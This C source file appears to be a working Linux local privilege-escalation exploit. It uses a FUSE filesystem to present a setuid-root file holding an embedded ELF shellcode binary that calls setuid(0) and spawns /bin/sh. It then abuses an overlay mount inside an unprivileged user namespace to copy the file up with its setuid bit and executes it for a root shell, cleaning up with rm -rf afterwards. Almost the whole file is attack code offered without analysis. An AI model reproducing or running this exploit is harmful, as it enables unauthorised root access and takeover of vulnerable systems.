#define FUSE_USE_VERSION 30

#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static char hello_path[0x1000] = "";
static char lowerdir[0x1000] = "";
static char upperdir[0x1000] = "";
static char workdir[0x1000] = "";
static char overlaydir[0x1000] = "";
char full_lowerdir[0x1000] = "";
char full_upperdir[0x1000] = "";
char full_workdir[0x1000] = "";
char full_overlaydir[0x1000] = "";

char *generate_random_str(const char *ran_end)
{
    static char str[16];
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    const int charset_size = sizeof(charset) - 1;

    srand((unsigned int)time(NULL));

    for (int i = 0; i < 14; ++i) {
        str[i] = charset[rand() % charset_size];
    }
    str[14] = ran_end[0];
    str[15] = '\0';
    return str;
}

void gen_random_path(){
    snprintf(hello_path, sizeof(hello_path), "/%s", generate_random_str("H"));
    snprintf(lowerdir, sizeof(lowerdir), generate_random_str("L"));
    snprintf(upperdir, sizeof(upperdir), generate_random_str("U"));
    snprintf(workdir, sizeof(workdir), generate_random_str("W"));
    snprintf(overlaydir, sizeof(overlaydir), generate_random_str("O"));
}

const char hello_str[] = {                                                                                                                          
    0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08,
    0x00, 0x80, 0x04, 0x08, 0x86, 0x00, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x31, 0xdb, 0x6a, 0x17,
    0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
    0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f,
    0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e,
    0x89, 0xe3, 0x52, 0xe8, 0x08, 0x00, 0x00, 0x00,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80
};


static int hellofs_getattr(const char *path, struct stat *stbuf)
{
    int res = 0;
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path, hello_path) == 0) {
    stbuf->st_mode = S_IFREG | S_ISUID | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = sizeof(hello_str); // zero-size file
    } else {
        res = -ENOENT;
    }

    return res;
}

static int hellofs_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                           off_t offset, struct fuse_file_info *fi)
{
    (void) offset;
    (void) fi;

    if (strcmp(path, "/") != 0) {
        return -ENOENT;
    }

    filler(buf, ".", NULL, 0);
    filler(buf, "..", NULL, 0);
    filler(buf, hello_path + 1, NULL, 0);

    return 0;
}

static int hellofs_open(const char *path, struct fuse_file_info *fi)
{
    if (strcmp(path, hello_path) != 0) {
        return -ENOENT;
    }

    return 0;
}

static int hellofs_read(const char *path, char *buf, size_t size, off_t offset,
                        struct fuse_file_info *fi)
{
    size_t len;
    (void) fi;
    if(strcmp(path, hello_path) != 0) {
        return -ENOENT;
    }
    len = sizeof(hello_str);
    if (offset < len) {
        if (offset + size > len) {
            size = len - offset;
        }
        memcpy(buf, hello_str + offset, size);
    } else {
        size = 0;
    }

    return size;
}

static struct fuse_operations hellofs_oper = {
    .getattr = hellofs_getattr,
    .readdir = hellofs_readdir,
    .open = hellofs_open,
    .read = hellofs_read,
};

int main(int argc, char *argv[])
{
    char base_dir[0x1000] = "./etmp_xbase_pdir";
    char argv_path[0x1000];
    if(argc < 2)
    {
        //printf("use default\r\n");
        strcpy(base_dir, "./etmp_xbase_pdir");
    }
    else{
        if (access(argv[1], W_OK) != 0) {
            printf("Need write privilege of path %s \r\n", argv[1]);
            exit(-1);
            }
        //printf("Custom path: %s\r\n", argv[1]);
        snprintf(argv_path, sizeof(argv_path), "%s/%s", argv[1], "etmp_xbase_pdir");
        //printf("tmp path: %s\r\n", argv_path);
        strcpy(base_dir, argv_path);
    }
    //printf("Custom path: %s\r\n", base_dir);
    gen_random_path();
    snprintf(full_lowerdir, sizeof(full_lowerdir), "%s/%s", base_dir, lowerdir);
    snprintf(full_upperdir, sizeof(full_upperdir), "%s/%s", base_dir, upperdir);
    snprintf(full_overlaydir, sizeof(full_overlaydir), "%s/%s", base_dir, overlaydir);
    snprintf(full_workdir, sizeof(full_workdir), "%s/%s", base_dir, workdir);
    char command[0x1000];
    snprintf(command, sizeof(command), "mkdir -p %s", full_lowerdir);
    //printf("Command: %s\r\n", command);
    system(command);
    char * fusedir[] = {"exp", full_lowerdir};
    if(!fork())
    {
        fuse_main(2,fusedir , &hellofs_oper, NULL);
    }
    snprintf(command, sizeof(command), "mkdir -p %s", full_upperdir);
    //printf("Command: %s\r\n", command);
    system(command);
    snprintf(command, sizeof(command), "mkdir -p %s", full_overlaydir);
    //printf("Command: %s\r\n", command);
    system(command);
    snprintf(command, sizeof(command), "mkdir -p %s", full_workdir);
    //printf("Command: %s\r\n", command);
    system(command);
    //unshare -Urm /bin/sh -c '{ mount -t overlay overlay -o lowerdir=/tmp/testfuse,upperdir=/tmp/updir,workdir=/tmp/workdir /tmp/overlaydir; touch /tmp/overlaydir/hello; }'
    snprintf(command, sizeof(command), "unshare -Urm /bin/sh -c '{ mount -t overlay overlay -o lowerdir=%s,upperdir=%s,workdir=%s %s; touch %s%s; }'", full_lowerdir, full_upperdir, full_workdir, full_overlaydir, full_overlaydir, hello_path);
    //printf("Command: %s\r\n", command);
    system(command);
    ///tmp/updir/hello
    snprintf(command, sizeof(command), "%s%s", full_upperdir, hello_path);
    //printf("Command: %s\r\n", command);
    system(command);
    //umount /tmp/$random/testfuse
    snprintf(command, sizeof(command), "umount %s", full_lowerdir);
    //printf("Command: %s\r\n", command);
    system(command);
    //printf("Manually delete %s\r\n", base_dir);
    printf("Auto delete %s\r\n", base_dir);
    snprintf(command, sizeof(command), "rm -rf %s", base_dir);
    system(command);
    return 0;
}